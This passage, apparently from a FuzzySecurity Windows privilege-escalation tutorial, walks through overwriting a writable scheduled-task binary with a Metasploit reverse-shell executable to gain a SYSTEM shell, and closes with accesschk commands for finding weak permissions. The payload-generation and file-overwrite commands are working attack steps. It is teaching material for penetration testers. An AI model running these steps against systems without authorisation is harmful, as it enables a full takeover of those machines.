+        FILE_TRAVERSE
+        SYNCHRONIZE
+        READ_CONTROL
+		
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">dir "E:\GrabLogs"</span>
+
+ Volume in drive E is More
+ Volume Serial Number is FD53-2F00
+
+ Directory of E:\GrabLogs
+
+02/18/2014  11:34 PM    &lt;DIR&gt;          .
+02/18/2014  11:34 PM    &lt;DIR&gt;          ..
+02/18/2014  11:34 PM    &lt;DIR&gt;          Logs
+02/18/2014  09:21 PM           180,736 tftp.exe
+               1 File(s)        180,736 bytes
+               3 Dir(s)   5,454,602,240 bytes free</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>Clearly this is a serious configuration issue, there is no need for this task to run as SYSTEM but even worse is the fact that any authenticated user has write access to the folder. Ideally for a pentesting engagement I would grab the TFTP client, backdoor the PE executable while making sure it still worked flawlessly and then drop it back on the target machine. However for the purpose of this example we can simple overwrite the binary with an executable generated by metasploit.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">root@darkside</span>:~# <span style="color:#2B8156;">msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O</span>
+
+       Name: Windows Command Shell, Reverse TCP Inline
+     Module: payload/windows/shell_reverse_tcp
+   Platform: Windows
+       Arch: x86
+Needs Admin: No
+ Total size: 314
+       Rank: Normal
+
+Provided by:
+  vlad902 &lt;vlad902@gmail.com&gt;
+  sf &lt;stephen_fewer@harmonysecurity.com&gt;
+
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+LHOST     127.0.0.1        yes       The listen address
+LPORT     9988             yes       The listen port
+
+Description:
+  Connect back to attacker and spawn a command shell
+
+<span style="color:#ff0000;">root@darkside</span>:~# <span style="color:#2B8156;">msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t
+exe &gt; /root/Desktop/evil-tftp.exe</span>
+
+[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>All that remains now is to upload our malicious executable and overwrite "E:\GrabLogs\tftp.exe". Once that is done we can get an early night sleep and wake up for our shell in the morning. An important thing to remember here is that we check the time/timezone on the box we are trying to compromise.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">dir</span>
+
+ Volume in drive C has no label.
+ Volume Serial Number is 948D-A98F
+
+ Directory of C:\Users\user1\Desktop
+
+02/19/2014  01:36 AM    &lt;DIR&gt;          .
+02/19/2014  01:36 AM    &lt;DIR&gt;          ..
+04/22/2013  09:39 AM           331,888 accesschk.exe
+02/19/2014  01:31 AM            73,802 evil-tftp.exe
+01/25/2014  12:46 AM            36,864 fubar.exe
+01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2
+06/30/2011  01:52 PM         1,667,584 ncat.exe
+02/18/2014  12:38 PM            14,336 wlbsctrl.dll
+11/22/2013  07:39 PM             1,225 wmic_info.bat
+               6 File(s)      2,125,699 bytes
+               3 Dir(s)      75,341,824 bytes free
+		
+<span style="color:#ff0000;">C:\Users\user1\Desktop</span>&gt; <span style="color:#2B8156;">copy evil-tftp.exe E:\GrabLogs\tftp.exe</span>
+
+Overwrite E:\GrabLogs\tftp.exe? (Yes/No/All): Yes
+        1 file(s) copied.</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>To demonstrate this privilege escalation in action I fast-forwarded the system time. From the screenshot below you we can see that we are presented with our SYSTEM shell promptly at 9AM.</p>
+<p>&nbsp;</p>
+<div class="four columns item element-4 Web Logo Animation" data-categories="Web Logo Animation">
+<div class="caption">
+<a href="images/priv04_big.png" rel="prettyPhoto[WinPrivTut]">
+<img src="images/priv04_small.png" alt="" class="pic">
+<span class="hover-effect zoom"></span></a>
+</div>
+<p>Schtasks Shell (LogGrabberTFTP)</p>
+</div>
+<p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
+<p>These two examples should give you an idea about the kind of vulnerabilities we need to look for when considering file/folder permissions. You will need to take time to examine ALL the binpaths for the windows services, scheduled tasks and startup tasks.<br><br>
+As we have been able to see accesschk is the tool of choice here. Before finishing off I'd like to give you a few final pointers on using accesschk.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># When executing any of the sysinternals tools for the first time the user will be presented with a GUI
+pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag
+to automatically accept the EULA.</strong></span>
+
+accesschk.exe /accepteula ... ... ...
+
+<span style="color:#990066;"><strong># Find all weak folder permissions per drive.</strong></span>
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+
+<span style="color:#990066;"><strong># Find all weak file permissions per drive.</strong></span>
+accesschk.exe -uwqs Users c:\*.*
+accesschk.exe -uwqs "Authenticated Users" c:\*.*</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<h2 class="title">Final Thoughts<span class="line"></span></h2>
+<p>This guide is meant to be a "fundamentals" for Windows privilege escalation. If you want to truly master the subject you will need to put in a lot of work and research. As with all aspects of pentesting, enumeration is key, the more you know about the target the more avenues of attack you have the higher the rate of success.<br><br>
+Also keep in mind that you may sometimes end up elevating your privileges to Administrator. Escalating privileges from Administrator to SYSTEM is a non-issue, you can always reconfigure a service or create a scheduled task with SYSTEM level privileges.<br><br>
+Now go forth and pop SYSTEM!!</p>
+</div>
+</div>
+</div>
+
+</div>
+</div>
+<div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+<span id="IDCommentsPostTitle" style="display:none"></span>
+<div id="idc-container-parent" class=""><div id="idc-container" class="idc"><div id="IDCommentPopup" style="display: none;" class="idc-info"> <div> <div id="IDCommentPopupInner"> <a href="#" class="idc-close"><span>Close</span></a> <h6>Forgot password?</h6> <form> <label for="txtResolveEmail">Please put in your email:</label> <input class="idc-text" id="txtResolveEmail" type="text"> <a href="#" class="idc-btn_s"><span>Send me my password!</span></a> </form> <p class="idc-bottom"><a href="#">Close message</a></p> </div> <div class="idc-bottom"></div> </div> </div><div id="IDCommentsHead" class="idc-head"> <span id="IDCommentsHeadDivider" style="display:none"></span> <div class="idc-right"> <a href="javascript: showLogin();" id="IDCommentsHeadLogin" class="idc-head_tools-login"><span>Login</span><span class="idc-r"></span></a> <div class="idc-share" onmouseover="showFollowThisDiscussion();" onmouseout="hideFollowThisDiscussion();"> <div class="idc-share_inner" id="IDCommentsHeadFollowMenu" onmouseover="showFollowThisDiscussion();" onmouseout="hideFollowThisDiscussion();"> <ul class="idc-share-tabs" onmouseover="showFollowThisDiscussion();" onmouseout="hideFollowThisDiscussion();"> <li id="IDShareMenuPost" class="idc-sel"><a href="javascript: IDShowFollowPost();"><span>This blog post</span></a></li> <li id="IDShareMenuBlog"><a href="javascript: IDShowFollowBlog();"><span>All blog posts</span></a></li> </ul> <div id="divIdcSharePost" onmouseover="showFollowThisDiscussion();" onmouseout="hideFollowThisDiscussion();"> <p>Subscribe to this blog post's comments through...</p> <ul class="idc-share-list"> <li><a href="https://www.netvibes.com/subscribe.php?type=rss&amp;url=https://www.intensedebate.com/postRSS/581656670"><img id="IDCommentsShowNetvibes" width="91" height="17" border="0" alt="Add to netvibes"></a></li> <li><a href="https://add.my.yahoo.com/rss?url=https://www.intensedebate.com/postRSS/581656670"><img id="IDCommentsShowYahoo" border="0" alt="Add to My Yahoo!"></a></li> </ul> <ul class="idc-share-list"> <li><a href="https://fusion.google.com/add?source=atgs&amp;feedurl=https://www.intensedebate.com/postRSS/581656670"><img id="IDCommentsShowGoogle" border="0" alt="Add to Google"></a></li> <li><a href="https://my.msn.com/addtomymsn.armx?id=rss&amp;ut=https://www.intensedebate.com/postRSS/581656670"><img id="IDCommentsShowMsn" border="0" style="width: 92px; height: 17px;" alt="Add to Microsoft Live"></a></li> </ul> <p class="idc-b"><a href="https://www.intensedebate.com/postRSS/581656670"><img id="IDCommentsShowRss" alt="RSS Icon"> RSS Feed</a></p> <div class="idc-subscribe-email"> <p><strong>Subscribe via email</strong></p> <span id="IDCSubscribeSpan0"><input type="text" value="Email Address" id="IDCSubscribeEmail0" class="idc-text" onfocus="this.style.color='#333';this.value='';" onblur="if(this.value==''){this.style.color='#ccc';this.value='Email Address';}"></span> <span id="IDCSubscribeSubmit0"><a class="idc-btn_s" href="javascript:IDCSubscribeByEmail(0);"><span></span><span class="idc-r">Subscribe</span></a> </span> </div> </div> <div id="divIdcShareBlog" style="display:none" onmouseover="showFollowThisDiscussion();" onmouseout="hideFollowThisDiscussion();"> <p>Subscribe to this blog's comments through...</p> <ul class="idc-share-list"> <li><a href="https://www.netvibes.com/subscribe.php?type=rss&amp;url=https://www.intensedebate.com/allBlogCommentsRSS/327294"><img id="IDCommentsShowNetvibes2" width="91" height="17" border="0" alt="Add to netvibes"></a></li> <li><a href="https://add.my.yahoo.com/rss?url=https://www.intensedebate.com/allBlogCommentsRSS/327294"><img border="0" alt="Add to My Yahoo!" id="IDCommentsShowYahoo2"></a></li> </ul> <ul class="idc-share-list"> <li><a href="https://fusion.google.com/add?source=atgs&amp;feedurl=https://www.intensedebate.com/allBlogCommentsRSS/327294"><img id="IDCommentsShowGoogle2" border="0" alt="Add to Google"></a></li> <li><a href="https://my.msn.com/addtomymsn.armx?id=rss&amp;ut=https://www.intensedebate.com/allBlogCommentsRSS/327294"><img border="0" id="IDCommentsShowMsn2" style="width: 92px; height: 17px;" alt="Add to Microsoft Live"></a></li> </ul> <p class="idc-b"><a href="https://www.intensedebate.com/allBlogCommentsRSS/327294"><img alt="RSS Icon" id="IDCommentsShowRss2"> RSS Feed</a></p> <div class="idc-subscribe-email"> <p><strong>Subscribe via email</strong></p> <span id="IDCSubscribeSpan1"><input type="text" value="Email Address" id="IDCSubscribeEmail1" class="idc-text" onfocus="this.style.color='#333';this.value='';" onblur="if(this.value==''){this.style.color='#ccc';this.value='Email Address';}"></span> <span id="IDCSubscribeSubmit1"><a class="idc-btn_s" href="javascript:IDCSubscribeByEmail(1);"><span></span><span class="idc-r">Subscribe</span></a> </span> </div> </div> </div> <a href="https://www.intensedebate.com/postRSS/581656670" class="idc-head_tools-share" title="https://www.intensedebate.com/postRSS/581656670" onmouseover="showFollowThisDiscussion();" onmouseout="hideFollowThisDiscussion();">Follow the discussion</a> </div> </div><h3><span id="idc-commentcount_label">Comments</span></h3><input type="hidden" id="userid" value="0"> <div class="idc-head_action idc-loggingin"> <span><img style="padding-right: 5px" src="https://www.intensedebate.com/images/ajax-loader.gif" alt="Loading..."> Logging you in...</span> </div> <div class="idc-head_action idc-login" id="IDLoginPopup"> <form id="IDfrmHeaderLogin" method="post" action="https://www.intensedebate.com/login"> <a href="javascript: hideLoginSignup();" class="idc-close"><span>Close</span></a> <p><strong>Login to IntenseDebate</strong></p> <p>Or <a href="https://www.intensedebate.com/signup" class="snap_noshots" target="_blank">create an account</a></p> <div class="idc-columns"> <div class="idc-divide"> <label for="IDtxtLoginEmail">Username or Email:</label> </div> <div class="idc-divide"> <label for="IDtxtLoginPass">Password:</label> </div> <span class="idc-clear"></span> </div> <div class="idc-divide"> <input id="IDtxtLoginEmail" name="txtLoginEmail" value="" class="idc-text" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');" type="text"> </div> <div class="idc-divide"> <input id="IDtxtLoginPass" name="txtLoginPass" class="idc-text idc-password" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');" type="password"> <p class="idc-fade"><a href="javascript: showForgotPassword();" class="snap_noshots">Forgot login?</a></p> </div> <div class="idc-head_b"> <div class="idc-tools"> <a class="idc-btn_l-secondary" href="javascript: hideLoginSignup();"><span></span><span class="idc-r">Cancel</span></a> <a href="javascript: logUserIn();" class="idc-btn_l"><span></span><span class="idc-r"><strong>Login</strong></span></a> </div> </div> </form> </div> <div class="idc-head_action idc-wp-login" id="IDWPLoginPopup"> <form id="IDfrmHeaderWPLogin" method="post" action="https://www.intensedebate.com/wp-login.php"> <a href="javascript: hideLoginSignup();" class="idc-close"><span>Close</span></a> <span> <img src="https://www.intensedebate.com/images/wordpress-logo.png" style="margin-bottom: -10px;"> <span style="font-size: 25px; padding-left: 5px; font-family: verdana,serif;">WordPress.com</span> </span> <div class="idc-columns" style="padding-top: 20px;"> <div class="idc-divide"> <label for="IDtxtWPLoginEmail">Username or Email:</label> </div> <div class="idc-divide"> <label for="IDtxtWPLoginPass">Password:</label> </div> <span class="idc-clear"></span> </div> <div class="idc-divide"> <input id="IDtxtWPLoginEmail" name="txtLoginEmail" value="" class="idc-text" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');" type="text"> </div> <div class="idc-divide"> <input id="IDtxtWPLoginPass" name="txtLoginPass" class="idc-text idc-password" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');" type="password"> <p class="idc-fade"><a href="https://wordpress.com/wp-login.php?action=lostpassword" target="_new" class="snap_noshots">Lost your password?</a></p> </div> <div class="idc-head_b"> <div class="idc-tools"> <input type="hidden" name="IDtxtWPIDSiteID" value="327294"> <a class="idc-btn_l-secondary" href="javascript: hideLoginSignup();"><span></span><span class="idc-r">Cancel</span></a> <a href="javascript: IDC.$('IDfrmHeaderWPLogin').submit()" class="idc-btn_l"><span></span><span class="idc-r"><strong>Login</strong></span></a> </div> </div> </form> </div> <div class="idc-head_action idc-user"> <div class="idc-right"> <a class="snap_noshots" href="https://www.intensedebate.com/userDash">Dashboard</a> <span class="idc-divider"><span>|</span></span> <a class="snap_noshots" href="https://www.intensedebate.com/editprofile">Edit profile</a> <span class="idc-divider"><span>|</span></span> <a class="snap_noshots" href="https://www.intensedebate.com/logout?_id_nonce=" id="idc-logout-link">Logout</a> </div> <div> <a id="IDCommentUserBarLink1" href="https://www.intensedebate.com/people/0" class="idc-a snap_noshots"></a> </div> <ul class="idc-user_i"> <li>Logged in as <a id="IDCommentUserBarLink2" class="snap_noshots" href="https://www.intensedebate.com/people/0"></a></li> </ul> <div class="idc-user_admin" id="idc-user_admin" style="display:none;"> <p><a href="javascript:showHideOpts();" id="IDAdminOptsLink" class="idc-collapselink_closed snap_noshots">Admin Options</a></p> <div id="showHideAdminOpts" style="display:none;"> <p> <input type="hidden" id="IDUserAdminVal" value="1"> <span onclick="javascript: changeDisabledLink();"><label for="chkDisableIDC" class="idc-nofloat"><input type="checkbox" id="chkDisableIDC"> Disable comments for this page</label></span> </p><p><a id="adminOptions" class="idc-btn_s snap_noshots"><span></span><span class="idc-r" id="IDCSavedSettings">Save Settings</span></a></p> <p></p> </div> </div> </div><span class="idc-clear"></span><div class="idc-message" id="commentMessage" style="display:none;"></div></div><div id="idc-cover" class="idc-comments">	<div class="idc-message" id="IDCommentsNoCommentsDiv"> There are no comments posted yet. <a href="javascript: document.getElementById('IDCommentNewThreadText').focus()">Be the first one!</a> </div></div>	<div id="IDCommentsNewThreadCover" class="idc-new"> <a name="respond"></a> <h3>Post a new comment</h3> <div class="idc-thread" id="IDCThread"> <div style="width: 100%;" id="IDCommentsNewThread" class="idc-c idc-reply idc-anonymous idc-signup"> <div class="idc-c-h" id="IDCommentsNewThreadHeader" style="display: none;"> <div class="idc-right" id="IDCommentsNewThreadHeaderRight"> <div class="idc-expand"></div> </div> </div> <ul class="idc-c-plugins" id="idc-plugin-buttons-new-thread"></ul> <div class="idc-c-t"> <form id="IDCommentNewThreadForm1"> <div class="idc-c-t-inner"> <textarea class="idc-text_noresize" style="color: rgb(204, 204, 204); width: 762px;" id="IDCommentNewThreadText" onfocus="txtOnFocus(this, 'Enter text right here!');" onblur="txtOnBlur(this, 'Enter text right here!');">Enter text right here!</textarea> <span class="idc-clear"> </span></div> </form> </div> <div class="idc-postnav" id="IDCPostNav"> <p id="IDCNavGuest2" style="display: inline;" class="idc-postnav-label"><span>Comment as a Guest, or login:</span></p> <ul class="idc-postnav-list" id="IDCNavList"> <li class="idc-first"><a href="javascript: showLogin();" class="idc-loginbtn_intensedebate">Login to IntenseDebate</a></li> <li class="idc-first"><a href="javascript: showWPLogin();" class="idc-loginbtn_wordpress">Login to WordPress.com</a></li> </ul> <a href="javascript: IDCNavReply('IDCNavGuest'); showSignupNewThread(); id_fbStopPoll(); id_show_nav();" id="IDCNavGuest" style="display:none;margin:2px 0;line-height:21px;">Go back</a> </div> <div class="idc-c-m idc-signup"> <form id="IDCommentNewThreadForm2"> <div style="width: 100%;"> <div class="idc-columns"> <div class="idc-column" id="IDCColumnNameLabel"> <label for="txtNameNewThread">Name</label> </div> <div class="idc-column" id="IDCColumnEmailLabel"> <label for="txtEmailNewThread">Email</label> </div> <div class="idc-column" id="IDCColumnURLLabel"> <label for="txtURLNewThread">Website (optional)</label> </div> <span class="idc-clear"></span> </div> <div class="idc-column" id="IDCColumnName"> <input type="text" id="txtNameNewThread" class="idc-text" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');"> <p class="idc-form-info">Displayed next to your comments.</p> </div> <div class="idc-column" id="IDCColumnEmailReply"> <input type="text" id="txtEmailNewThread" class="idc-text" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');"> <p class="idc-form-info">Not displayed publicly.</p> </div> <div class="idc-column" id="IDCColumnURL"> <input type="text" class="idc-text" id="txtURLNewThread" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');"> <p class="idc-form-info">If you have a website, link to it here.</p> </div> </div> </form> </div> <p id="IDCommentsNewThreadListItem1" style="display:none;">Posting anonymously.</p> <p id="IDNewThreadTweetThisWrapper" style="display:none"><label for="IDNewThreadTweetThis" class="idc-nofloat"><input type="checkbox" id="IDNewThreadTweetThis"> Tweet this comment</label></p> <div class="idc-c-b"> <div class="idc-right" id="IDNewThreadSubmitLI"> <a class="idc-btn_l" href="javascript: postComment(0);"><span></span><span class="idc-r"><strong>Submit Comment</strong></span></a> </div> <div class="idc-new_subscribe" id="IDSubscribeToThisWrapper"> <!--<input type="checkbox" id="IDSubscribeToThis" class="idc-chk" />--> <label for="IDSubscribeToThis" class="idc-nofloat"> Subscribe to <select id="IDSubscribeToThis" name="IDSubscribeToThis"> <option value="-1" id="IDSubscribeToThis-def">None</option> <option value="1" id="IDSubscribeToThis-replies">Replies</option> <option value="0">All new comments</option> </select> </label> </div> <div class="idc-customtext"> <span id="customText"></span> </div> <span class="idc-clear"></span> </div> </div> </div> </div> <div class="idc-foot"> <p class="idc-id"><span>Comments by </span><a href="https://www.intensedebate.com/" class="idc-idlogo" target="_blank">IntenseDebate</a></p> <span class="idc-clear"></span> </div><div id="divReplyExpandingText" class="idc-measure"></div><div id="divNewPostExpandingText" class="idc-measure"></div><div style="display: none;" class="idc-c idc-reply idc-anonymous idc-signup" id="IDCommentReplyDiv"><p class="idc-header" id="IDCommentReplyName"></p> <ul class="idc-c-plugins" id="idc-plugin-buttons-reply"></ul> <div class="idc-c-t"> <div class="idc-c-t-inner"> <form id="IDCommentReplyForm1"> <textarea id="txtComment" class="idc-text_noresize" onfocus="txtOnFocus(this, 'Enter text right here!');" onblur="txtOnBlur(this, 'Enter text right here!');">Enter text right here!</textarea> </form> <span class="idc-clear"> </span></div> </div> <div class="idc-postnav" id="IDCPostNavReply"> <p id="IDCNavGuestReply2" style="display: inline;" class="idc-postnav-label"><span>Reply as a Guest, or login:</span></p> <ul class="idc-postnav-list" id="IDCNavListReply"> <li class="idc-first"><a href="javascript: showLogin();" class="idc-loginbtn_intensedebate">Login to IntenseDebate</a></li> <li class="idc-first"><a href="javascript: showWPLogin();" class="idc-loginbtn_wordpress">Login to WordPress.com</a></li> </ul> <a href="javascript: IDCNavReply('IDCNavGuestReply'); showSignupReply(); id_fbStopPoll(); id_show_nav();" id="IDCNavGuestReply" style="display:none;margin:2px 0;line-height:21px;">Go back</a> </div> <div class="idc-c-m idc-signup" id="IDCommentReplyOuterDiv"> <form id="IDCommentReplyForm2"> <div style="width: 100%;" id="IDCommentReplyInnerDiv"> <div class="idc-columns"> <div class="idc-column" id="IDCColumnNameReplyLabel"> <label for="txtNameReply">Name</label> </div> <div class="idc-column" id="IDCColumnEmailReplyLabel"> <label for="txtEmailReply">Email</label> </div> <div class="idc-column" id="IDCColumnURLReplyLabel"> <label for="txtURLReply">Website (optional)</label> </div> <span class="idc-clear"></span> </div> <div class="idc-column" id="IDCColumnNameReply"> <input type="text" id="txtNameReply" class="idc-text" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');"> <p class="idc-form-info">Displayed next to your comments.</p> </div> <div class="idc-column" id="IDCColumnEmailReply"> <input type="text" id="txtEmailReply" class="idc-text" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');"> <p class="idc-form-info">Not displayed publicly.</p> </div> <div class="idc-column" id="IDCColumnURLReply"> <input type="text" class="idc-text" id="txtURLReply" onfocus="txtOnFocus(this, '');" onblur="txtOnBlur(this, '');"> <p class="idc-form-info">If you have a website, link to it here.</p> </div> </div> </form> </div> <p id="IDCommentReplyListItem1" style="display:none;">Posting anonymously.</p> <p id="IDReplyTweetThisWrapper" style="display:none"><label for="IDReplyTweetThis" class="idc-nofloat"><input type="checkbox" id="IDReplyTweetThis"> Tweet this comment</label></p> <div class="idc-c-b"> <div class="idc-right" id="IDReplyDivSubmitLI"> <a href="javascript: hideReply();" class="idc-btn_l-secondary"><span></span><span class="idc-r">Cancel</span></a> <a id="IDReplyDivSubmitLIButton" class="idc-btn_l" href="javascript: postComment(1);"><span></span><span class="idc-r"><strong>Submit Comment</strong></span></a> </div> <div class="idc-new_subscribe" id="IDSubscribeToThisWrapperReply"> <!--<input type="checkbox" id="IDSubscribeToThisReply" class="idc-chk" />--> <label for="IDSubscribeToThisReply" class="idc-nofloat"> Subscribe to <select id="IDSubscribeToThisReply" name="IDSubscribeToThisReply"> <option value="-1" id="IDSubscribeToThisReply-def">None</option> <option value="1" id="IDSubscribeToThisReply-replies">Replies</option> <option value="0">All new comments</option> </select> </label> </div> <span class="idc-clear"></span> </div></div><iframe src="https://www.intensedebate.com/empty.php" style="display: none;"></iframe><img src="https://www.intensedebate.com/remoteCheckin.php?token=Qs9MSA5L5qjdH3BS4eWppXc6FxGuMuAg&amp;blogpostid=581656670&amp;time=1718454005577" style="display: none;"></div><span id="idc-clear"></span></div><script type="text/javascript" src="https://intensedebate.com/comment/77033bd2b8799fdea5c0f689f55f6e1e/generic/581656670"></script><script type="text/javascript" src="https://www.intensedebate.com/js/genericCommentWrapperV2.js"></script>
+</div>
+</div>
+<footer>
+<div class="container">
+<div class="six columns"><span class="copyright">
+© Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+<div class="six columns">
+<p><a href="../index.html">Home</a> |
+<a href="../tutorials.html">Tutorials</a> |
+<a href="../coding.html">Scripting</a> |
+<a href="../exploits.html">Exploits</a> |
+<a href="../links.html">Links</a> |
+<a href="../contact.html">Contact</a></p>
+</div>
+</div>
+</footer>
+
+
+<div class="switcher"></div>
+
+
+
+<a href="#" id="toTop" style="display: none;"><span id="toTopHover"></span>To Top</a><style>@namespace fb "http://www.facebook.com/2008/fbml";#idc-container{margin:1.5em 0;max-width:800px;min-width:180px;float:none;letter-spacing:normal!important;text-align:left;width:auto}#idc-container.idc-inline{clear:both;height:400px;margin:1.2em 0;overflow:auto;overflow-x:hidden;overflow-y:auto;padding:0 8px 0 0}#idc-container .idc-trackbacks,#idc-container .idc-comments,#idc-container .idc-new{margin:0 0 1.5em}#idc-container div *{font-weight:normal;letter-spacing:0!important;margin:0;padding:0;text-indent:0}#idc-container fb\:login-button,#idc-container fb|login-button{color:white;background:#5f78ab url(https://www.intensedebate.com/images/facebook-login.png) no-repeat left -211px;display:block;height:21px}#idc-container fb\:login-button span,#idc-container fb|login-button span{font-weight:bold;font-family:"lucida grande",tahoma,verdana,arial,sans-serif;font-size:11px}#idc-container div span.fb_button_text{font-weight:bold;margin:1px 1px 0 21px;padding:2px 6px 2px 6px}#idc-container div span.fb_button_text span{padding:0}#idc-container div div div{text-transform:none}#idc-container img{border:0;background:0;padding:0}#idc-container span{display:inline}#idc-container span.fb_button_text{display:block}#idc-container strong,#idc-container .idc-c-t b{font-weight:bold!important}#idc-container .idc-c-t ol,#idc-container .idc-c-t ul{padding:0 0 0 20px}#idc-container .idc-c-t li{display:list-item;list-style:disc}#idc-container .idc-c-t ol li{list-style:decimal}#idc-container a{background-image:none;clear:none!important;float:none;font-weight:normal;display:inline;border:none!important;padding:0!important}#idc-container a.fb_button{background:#29447e url(https://www.intensedebate.com/images/facebook-login.png) no-repeat left -211px;display:inline-block;padding:0 0 0 1px!important}#idc-container blockquote{padding:0 0 0 10px!important}#idc-container div{background:0;clear:left;display:block;float:none;margin:0;width:auto;font-size:13px;line-height:1.3em;overflow:visible;position:static}#idc-container h3,#idc-container h4,#idc-container h6{background:0;border:0;letter-spacing:0;padding:0;margin:0;clear:none;position:static;text-align:left;font-weight:normal}#idc-container h3{font-size:22px;line-height:1.3em;margin:0 0 8px}#idc-container .idc-text{background:#fff url(https://www.intensedebate.com/themes/universal/images/idc-grey-0926.png) no-repeat -713px -121px;border:1px solid #ccc;border-top:1px solid #b0b0b0;color:#333;cursor:text;float:left;padding:3px;margin:0 4px 4px 0;font-size:12px;line-height:1.3em;font:normal 12px/1.3em Helvetica,Arial,sans-serif;-moz-border-radius:4px;-khtml-border-radius:4px;-webkit-border-radius:4px;border-radius:4px;-moz-border-radius-bottomleft:}#idc-container div.idc-text,#idc-container textarea.idc-text{height:50px;margin:0 0 4px;min-height:50px;overflow:hidden;width:97.8%}#idc-container div.idc-text_noresize,#idc-container textarea.idc-text_noresize{background:#fff url(https://www.intensedebate.com/themes/universal/images/idc-grey-0926.png) no-repeat -713px -121px;border:1px solid #ccc;border-top:1px solid #b0b0b0;color:#333;float:left;height:100px!important;padding:3px;margin:0 0 4px;font-size:12px;line-height:1.3em;font:normal 12px/1.3em Helvetica,Arial,sans-serif;width:97.8%;-moz-border-radius:4px;-khtml-border-radius:4px;-webkit-border-radius:4px;border-radius:4px}#idc-container textarea.idc-text:hover,#idc-container textarea.idc-text_noresize:hover,#idc-container .idc-text:hover{border:1px solid #aaa;border-top:1px solid #909090}#idc-container.idc .idc-focus{border:1px solid #c9e31a!important;border-top:1px solid #a0b513!important}#idc-container .idc-radio,#idc-container .idc-chk{border:0;margin:2px 2px 0 0;padding:0}#idc-container .idc-radio{float:left}#idc-container .idc-btn_input{background:#f2f2f2;border:1px solid #bbb;cursor:pointer;font-size:11px!important;line-height:16px!important;padding:2px 8px;text-decoration:none;-moz-border-radius:11px;-khtml-border-radius:11px;-webkit-border-radius:11px;border-radius:1}#idc-container .idc-btn_input:hover{border-color:#909090}#idc-container select{margin:0 4px 4px 0;float:none;width:auto}#idc-container label{clear:none;display:inline;float:left;line-height:1.3em;width:auto}#idc-container p{clear:left;margin:0 0 8px}#idc-container ul,#idc-container li{background:0;display:block;float:none;border:0;margin:0;padding:0}#idc-container li{list-style-type:none;display:list-item}#idc-container .idc-nomargin{margin:0}#idc-container .idc-moremargin{margin:0 0 .8em}#idc-container .idc-nofloat{float:none}#idc-container .idc-right{float:right!important}#idc-container .idc-divide{float:left;width:50%}#idc-container .idc-secondary{font-size:11px}.idc-measure{border:1px solid #fff!important;float:none!important;font:normal 12px/1.3em Helvetica,Arial,sans-serif!important;left:0!important;padding:3px!important;position:absolute!important;text-align:left!important;top:0!important;visibility:hidden!important;width:auto!important;z-index:-1!important}#idc-container .idc-loading{clear:both;display:block;float:none;margin:1em 0;text-align:center;width:auto}#idc-container .idc-loading p{line-height:16px!important}#idc-container .idc-loading img{margin:0 0 -3px}#idc-container .idc-close{width:15px;height:15px;background:url(https://www.intensedebate.com/themes/universal/images/idc-universal.png?=4) no-repeat 0 -56px;float:right}#idc-container .idc-close span{display:none}#idc-container .idc-close:hover{background-position:0 -71px}#idc-container .idc-sourceimg{float:left;margin:0 4px 2px 0}#idc-container .idc-collapselink_closed,#idc-container .idc-collapselink{background:url(https://www.intensedebate.com/themes/universal/images/idc-color-1223.png) no-repeat -538px -46px;font-weight:bold;line-height:16px!important;margin:0 0 0 4px;overflow:hidden;padding:0 0 0 12px!important}#idc-container .idc-collapselink_closed,#idc-container .idc-collapse .idc-collapselink{background-position:-538px -8px}#idc-container .idc-thread_active{color:#666;font-size:11px}#idc-container .idc-customtext{margin:8px 0 0}#idc-container .idc-customtext strong,#idc-container .idc-customtext b{font-weight:bold}#idc-container .idc-customtext em,#idc-container .idc-customtext i{font-style:italic}#idc-container .idc-customtext ul,#idc-container .idc-customtext ol,#idc-container .idc-customtext dl{padding:0 0 0 20px}#idc-container .idc-customtext ul li{list-style:disc}#idc-container .idc-customtext ol li{list-style:decimal}#idc-container .idc-message{background:url(https://www.intensedebate.com/themes/universal/images/idc-bg-1223.png) repeat-x 0 -700px;clear:both;float:left;margin:.5em 0;padding:1% 1.5%;width:97%;-moz-border-radius:4px;-khtml-border-radius:4px;-webkit-border-radius:4px;border-radius:4px}#idc-container .idc-trackbacks-more a{background:url(https://www.intensedebate.com/themes/universal/images/idc-bg-1223.png) repeat-x 0 -700px;display:block;padding:8px 0!important;text-align:center;-moz-border-radius:4px;-o-border-radius:4px;-webkit-border-radius:4px;-khtml-border-radius:4px;border-radius:4px}#idc-container .idc-thread_cover{background:url(https://www.intensedebate.com/themes/chameleon/images/idc-arrow.png) no-repeat 0 6px;padding:0 0 12px 18px}#idc-container .idc-thread_cover 